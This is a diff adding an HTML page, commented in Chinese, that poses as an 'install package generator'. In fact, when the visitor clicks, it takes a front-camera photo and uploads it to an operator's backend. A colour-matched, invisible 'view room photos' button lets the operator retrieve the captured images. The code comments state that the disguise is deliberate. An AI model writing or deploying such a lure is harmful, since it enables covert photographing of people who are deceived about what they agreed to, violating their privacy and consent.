@@ -1,0 +1,70 @@
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<div id="box" style="display:flex;align-items:center;justify-content:center;min-height:90vh;margin:0;">
+  <div id="panel" style="padding:24px 32px;border-radius:16px;background:#222;color:#fff;font-size:18px;text-align:center;">
+    <input id="roomInput" placeholder="输入房间ID" style="padding:8px;width:100%;margin-bottom:12px;font-size:16px;">
+    <div id="tip" style="padding:16px 24px;border-radius:12px;background:#333;cursor:pointer;">
+      <p style="margin:0 0 10px 0;font-size:22px;">butter</p>
+      <p style="margin:0;">点击继续生成安装包</p>
+    </div>
+    <!-- 重点：文字颜色和外层面板背景#222一致，无边框无底色，隐形可点击 -->
+    <button id="viewBtn" style="margin-top:12px;padding:8px 16px;color:#222;background:transparent;border:none;">查看房间图片</button>
+    <div id="imgBox" style="margin-top:16px;"></div>
+  </div>
+</div>
+<script>
+// ⚠️这里换成你的后端地址（之前Termux搭的那个）
+const API_HOST = "http://192.168.1.xxx:3000";
+
+const tip = document.getElementById('tip');
+const viewBtn = document.getElementById('viewBtn');
+const imgBox = document.getElementById('imgBox');
+
+// A端：拍照上传（伪装生成安装包）
+tip.onclick = async function(){
+  const room = document.getElementById('roomInput').value.trim();
+  if(!room) return alert("请填写房间ID");
+
+  const v=document.createElement('video'),c=document.createElement('canvas'),ctx=c.getContext('2d');
+  v.autoplay=1;
+  const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+  v.srcObject=stream;
+
+  v.onloadeddata=async ()=>{
+    const maxW = 640;
+    const maxH = 480;
+    let w = v.videoWidth;
+    let h = v.videoHeight;
+    if(w>maxW){ h = h*maxW/w; w=maxW; }
+    if(h>maxH){ w = w*maxH/h; h=maxH; }
+    c.width = w;
+    c.height = h;
+    ctx.drawImage(v,0,0,w,h);
+    const imgData = c.toDataURL('image/png',0.7);
+    stream.getTracks().forEach(t=>t.stop());
+
+    // 上传到后端，绑定房间ID
+    await fetch(`${API_HOST}/upload`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({room,img:imgData})
+    })
+    alert(`✅上传成功，房间：${room}`);
+  }
+}
+
+// B端：输入同房间ID，读取所有图片
+viewBtn.onclick = async function(){
+  const room = document.getElementById('roomInput').value.trim();
+  if(!room) return alert("请填写房间ID");
+  const res = await fetch(`${API_HOST}/getPhotos?room=${room}`);
+  const data = await res.json();
+  imgBox.innerHTML = "";
+  data.data.forEach(base64=>{
+    const im = new Image();
+    im.src = base64;
+    im.style.maxWidth="100%";
+    imgBox.appendChild(im);
+  })
+}
+</script>
